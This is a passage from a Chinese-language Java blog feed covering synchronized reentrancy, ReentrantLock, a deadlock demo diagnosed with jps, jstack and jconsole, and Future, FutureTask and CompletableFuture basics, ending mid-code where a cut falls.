id="Synchronized的重入的实现机理"><a href="#Synchronized的重入的实现机理" class="headerlink" title="Synchronized的重入的实现机理"></a>Synchronized的重入的实现机理</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">140</span>行</span><br><span class="line">  <span class="built_in">ObjectMonitor</span>() &#123;</span><br><span class="line">    _header       = <span class="literal">NULL</span>;</span><br><span class="line">    _count        = <span class="number">0</span>; <span class="comment">//用来记录该线程获取锁的次数</span></span><br><span class="line">    _waiters      = <span class="number">0</span>,</span><br><span class="line">    _recursions   = <span class="number">0</span>;<span class="comment">//锁的重入次数</span></span><br><span class="line">    _object       = <span class="literal">NULL</span>;</span><br><span class="line">    _owner        = <span class="literal">NULL</span>; <span class="comment">//------最重要的----指向持有ObjectMonitor对象的线程，记录哪个线程持有了我</span></span><br><span class="line">    _WaitSet      = <span class="literal">NULL</span>; <span class="comment">//存放处于wait状态的线程队列</span></span><br><span class="line">    _WaitSetLock  = <span class="number">0</span> ;</span><br><span class="line">    _Responsible  = <span class="literal">NULL</span> ;</span><br><span class="line">    _succ         = <span class="literal">NULL</span> ;</span><br><span class="line">    _cxq          = <span class="literal">NULL</span> ;</span><br><span class="line">    FreeNext      = <span class="literal">NULL</span> ;</span><br><span class="line">    _EntryList    = <span class="literal">NULL</span> ;<span class="comment">//存放处于等待锁block状态的线程队列</span></span><br><span class="line">    _SpinFreq     = <span class="number">0</span> ;</span><br><span class="line">    _SpinClock    = <span class="number">0</span> ;</span><br><span class="line">    OwnerIsThread = <span class="number">0</span> ;</span><br><span class="line">    _previous_owner_tid = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>每个锁对象拥有一个锁计数器和一个指向持有该锁的线程的指针。</p><p>首次加锁：当执行monitorenter时，如果目标锁对象的计数器为零，那么说明它没有被其他线程所持有，Java虚拟机会将该锁对象的持有线程设置为当前线程，并且将其计数器加1。</p><p>重入：在目标锁对象的计数器不为零的情况下，如果锁对象的持有线程是当前线程，那么 Java 虚拟机可以将其计数器加1，否则需要等待，直至持有线程释放该锁。</p><p>释放锁：当执行monitorexit时，Java虚拟机则需将锁对象的计数器减1。计数器为零代表锁已被释放。</p><h2 id="显式锁ReentrantLock"><a href="#显式锁ReentrantLock" class="headerlink" title="显式锁ReentrantLock"></a>显式锁ReentrantLock</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReEntryLockDemo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;----外层调用lock&quot;</span>);</span><br><span class="line">                lock.lock();</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;----内层调用lock&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="comment">// 这里故意注释，实现加锁次数和释放次数不一样</span></span><br><span class="line">                    <span class="comment">// 由于加锁次数和释放次数不一样，第二个线程始终无法获取到锁，导致一直在等待。</span></span><br><span class="line">                    lock.unlock(); <span class="comment">// 正常情况，加锁几次就要解锁几次</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;a&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;b thread----外层调用lock&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;b&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="死锁及排查"><a href="#死锁及排查" class="headerlink" title="死锁及排查"></a>死锁及排查</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>死锁是指两个或两个以上的线程在执行过程中，因争夺资源而造成的一种<strong>互相等待的现象</strong>，若无外力干涉那它们都将无法推进下去，如果系统资源充足，进程的资源请求都能够得到满足，死锁出现的可能性就很低，否则就会因争夺有限的资源而陷入死锁。</p><p>死锁产生的原因：</p><ul><li>系统资源不足</li><li>进程运行推进的顺序不合适</li><li>资源分配不当</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20221007003239.png"></p><h2 id="死锁代码case"><a href="#死锁代码case" class="headerlink" title="死锁代码case"></a>死锁代码case</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objectLockA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objectLockB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (objectLockA) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;自己持有A，希望获得B&quot;</span>);</span><br><span class="line">                <span class="comment">//暂停几秒钟线程</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (objectLockB) &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;A-------已经获得B&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (objectLockB) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;自己持有B，希望获得A&quot;</span>);</span><br><span class="line">                <span class="comment">//暂停几秒钟线程</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (objectLockA) &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;B-------已经获得A&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h2><p><strong>纯命令：</strong></p><ul><li><code>jps -l</code> 查看当前进程运行状况</li><li><code>jstack 进程编号</code> 查看该进程信息</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PS D:\javaProjects\JUC\src&gt; jps -l</span><br><span class="line">10280 sun.tools.jps.Jps</span><br><span class="line">14040 Main</span><br><span class="line">10204 org.jetbrains.jps.cmdline.Launcher</span><br><span class="line">9868 </span><br><span class="line">PS D:\javaProjects\JUC\src&gt; jstack 14040                      </span><br><span class="line">2022-10-07 00:37:37                                                        </span><br><span class="line">Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.311-b11 mixed mode):</span><br><span class="line">......</span><br><span class="line">Found one Java-level deadlock:</span><br><span class="line">=============================</span><br><span class="line">&quot;B&quot;:</span><br><span class="line">  waiting to lock monitor 0x000001cd1a7b6c38 (object 0x0000000780cc9668, a java.</span><br><span class="line">lang.Object),</span><br><span class="line">  which is held by &quot;A&quot;</span><br><span class="line">&quot;A&quot;:</span><br><span class="line">  waiting to lock monitor 0x000001cd1a7b9578 (object 0x0000000780cc9678, a java.</span><br><span class="line">lang.Object),</span><br><span class="line">  which is held by &quot;B&quot;</span><br><span class="line"></span><br><span class="line">Java stack information for the threads listed above:</span><br><span class="line">===================================================</span><br><span class="line">&quot;B&quot;:</span><br><span class="line">        at Main.lambda$main$1(Main.java:33)</span><br><span class="line">        - waiting to lock &lt;0x0000000780cc9668&gt; (a java.lang.Object)</span><br><span class="line">        - locked &lt;0x0000000780cc9678&gt; (a java.lang.Object)</span><br><span class="line">        at Main$$Lambda$2/990368553.run(Unknown Source)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:748)</span><br><span class="line">&quot;A&quot;:</span><br><span class="line">        at Main.lambda$main$0(Main.java:18)</span><br><span class="line">        - waiting to lock &lt;0x0000000780cc9678&gt; (a java.lang.Object)</span><br><span class="line">        - locked &lt;0x0000000780cc9668&gt; (a java.lang.Object)</span><br><span class="line">        at Main$$Lambda$1/2003749087.run(Unknown Source)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:748)</span><br><span class="line"></span><br><span class="line">Found 1 deadlock.</span><br></pre></td></tr></table></figure><p><strong>图形化：</strong></p><ul><li><code>win</code> + <code>r</code> 输入<code>jconsole</code> ，打开图形化工具，打开<code>线程</code> ，点击 <code>检测死锁</code>。</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20221007004134.png"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>指针指向monitor对象（也称为管程或监视器锁）的起始地址。每个对象都存在着一个monitor与之关联，当一个monitor被某个线程持有后，它便处于锁定状态。在Java虚拟机(HotSpot)中，monitor是由ObjectMonitor实现的，其主要数据结构如下（位于HotSpot虚拟机源码ObjectMonitor.hpp,C++实现的）</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/2022100704915.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> JUC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> synchronized </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CompletableFuture</title>
      <link href="/posts/55918/"/>
      <url>/posts/55918/</url>
      
        <content type="html"><![CDATA[<h1 id="Future和Callable接口"><a href="#Future和Callable接口" class="headerlink" title="Future和Callable接口"></a>Future和Callable接口</h1><p><strong>Future接口</strong>(FutureTask实现类)定义了操作异步任务执行的一些方法，如获取异步任务的执行结果、取消任务的执行、判断任务是否被取消、判断任务执行是否完毕等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Future</span>&lt;V&gt; &#123;</span><br><span class="line"><span class="type">boolean</span> <span class="title function_">cancel</span><span class="params">(<span class="type">boolean</span> mayInterruptIfRunning)</span>;</span><br><span class="line"><span class="type">boolean</span> <span class="title function_">isCancelled</span><span class="params">()</span>;</span><br><span class="line"><span class="type">boolean</span> <span class="title function_">isDone</span><span class="params">()</span>;</span><br><span class="line">V <span class="title function_">get</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException, ExecutionException;</span><br><span class="line">V <span class="title function_">get</span><span class="params">(<span class="type">long</span> timeout, TimeUnit unit)</span></span><br><span class="line">        <span class="keyword">throws</span> InterruptedException, ExecutionException, TimeoutException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Future接口可以为主线程开一个异步线程，专门为主线程处理耗时和费力的复杂业务。</p></blockquote><hr><p><strong>Callable接口</strong>中定义了需要有返回的任务需要实现的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Thread1</span> <span class="keyword">implements</span> <span class="title class_">Callable</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Thread2</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与使用Runnable接口相比， Callable接口功能更强大些：</p><ul><li><p>方法可以有返回值</p></li><li><p>方法可以抛出异常</p></li><li><p>支持泛型的返回值</p></li></ul><h1 id="FutureTask类"><a href="#FutureTask类" class="headerlink" title="FutureTask类"></a>FutureTask类</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>现在我们需要有异步多线程执行任务且有返回结果，需要满足三个特点：多线程&#x2F;有返回&#x2F;异步任务</p><p><strong>分析：</strong></p><ul><li><code>Thread</code>类可以创建<strong>多线程</strong>，其构造方法可以传实现了<code>Runnable</code>接口的类</li><li>而<code>RunnableFuture</code>接口既继承了<code>Runnable</code>接口，也继承了<code>Future</code>接口（<strong>异步任务</strong>）</li><li><code>FutureTask</code>类实现了<code>RunnableFuture</code>接口，而且其构造方法可以传入<code>Callable</code>接口（<strong>有返回值</strong>）或<code>Runnable</code>接口的实现类</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20221001231026.png"></p><hr><p><strong>实现：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">        FutureTask&lt;String&gt; futureTask = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">MyThread</span>());</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(futureTask, <span class="string">&quot;thread&quot;</span>);</span><br><span class="line">        thread.start();</span><br><span class="line">        System.out.println(futureTask.get());<span class="comment">//接收返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span> <span class="keyword">implements</span> <span class="title class_">Callable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;-----come in call()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;返回值&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>FutureTask实现类的优点是<strong>异步多线程(Future)+线程池</strong>进行任务配合，能显著提高程序的执行效率。但也有缺点：</p><ul><li>一旦调用get()方法，不管是否计算完成都会导致阻塞（所以一般get方法放到最后）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException, TimeoutException &#123;</span><br><span class="line">        FutureTask&lt;String&gt; futureTask = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;-----come in FutureTask&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">3</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;task over&quot;</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(futureTask, <span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        t1.start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3秒钟后才出来结果，还没有计算你提前来拿(只要一调用get方法，对于结果就是不见不散，会导致阻塞)</span></span><br><span class="line">        <span class="comment">//System.out.println(Thread.currentThread().getName()+&quot;\t&quot;+futureTask.get());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3秒钟后才出来结果，我只想等待1秒钟，过时不候， 超时会抛出Timeout异常</span></span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + futureTask.get(<span class="number">1L</span>, TimeUnit.SECONDS));</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot; run... here&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果想要异步获取结果，通常都会以轮询的方式去获取结果，尽量不要阻塞，但轮询的方式会耗费无谓的CPU资源，而且也不见得能及时地得到计算结果。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException, TimeoutException &#123;</span><br><span class="line">        FutureTask&lt;String&gt; futureTask = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;-----come in FutureTask&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">3</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;task over&quot;</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(futureTask, <span class="string">&quot;t1&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;线程完成任务&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 用于阻塞式获取结果,如果想要异步获取结果,通常都会以轮询的方式去获取结果</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (futureTask.isDone()) &#123;</span><br><span class="line">                System.out.println(futureTask.get());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CompletableFuture类"><a href="#CompletableFuture类" class="headerlink" title="CompletableFuture类"></a>CompletableFuture类</h1><p>阻塞的方式和异步编程的设计理念相违背，而轮询的方式会消耗无谓的CPU资源。因此，JDK8 设计出CompletableFuture实现类。</p><h2 id="基本介绍-1"><a href="#基本介绍-1" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>CompletableFuture类：</p><p><code>public class CompletableFuture&lt;T&gt; implements Future&lt;T&gt;, CompletionStage&lt;T&gt;</code></p><ul><li><p>在Java 8中， CompletableFuture 提供了非常强大的 Future 的扩展功能， 可以帮助我们简化异步编程的复杂性， 并且提供了函数式编程的能力， 可以通过<strong>回调</strong>的方式处理计算结果， 也提供了转换和组合CompletableFuture 的方法。</p></li><li><p>它可能代表一个明确完成的 Future， 也有可能代表一个完成阶段(Completion Stage) ， 它支持在计算完成以后触发一些函数或执行某些动作。</p></li><li><p>它实现了 Future 和 CompletionStage 接口。</p></li></ul><hr><p>CompletionStage接口:</p><ul><li><p>CompletionStage代表异步计算过程中的<strong>某一个阶段</strong>， 一个阶段完成以后可能会触发另外一个阶段</p></li><li><p>一个阶段的计算执行可以是一个Function， Consumer或者Runnable。比如：<code>stage.thenApply(x-&gt;square(x) ) .then Accept(x-&gt;System.out.print(x) ) .then Run() -&gt;System.out.print In() )</code></p></li><li><p>一个阶段的执行可能是被单个阶段的完成触发，也可能是由多个阶段一起触发。</p></li></ul><h2 id="四大静态方法"><a href="#四大静态方法" class="headerlink" title="四大静态方法"></a>四大静态方法</h2><ul><li><p>runAsync 无返回值</p></li><li><p>supplyAsync 有返回值(Supplier供给型函数式接口，没有输入参数，需要返回值)</p></li><li><p>没有指定Executor的方法，直接使用默认的ForkJoinPool.commonPool() 作为它的线程池执行异步代码</p></li><li><p>如果指定线程池，则使用我们自定义的或者特别指定的线程池执行异步代码</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> CompletableFuture&lt;Void&gt; <span class="title function_">runAsync</span><span class="params">(Runnable runnable)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> asyncRunStage(asyncPool, runnable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> CompletableFuture&lt;Void&gt; <span class="title function_">runAsync</span><span class="params">(Runnable runnable,</span></span><br><span class="line"><span class="params">                                               Executor executor)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> asyncRunStage(screenExecutor(executor), runnable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;U&gt; CompletableFuture&lt;U&gt; <span class="title function_">supplyAsync</span><span class="params">(Supplier&lt;U&gt; supplier)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> asyncSupplyStage(asyncPool, supplier);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> 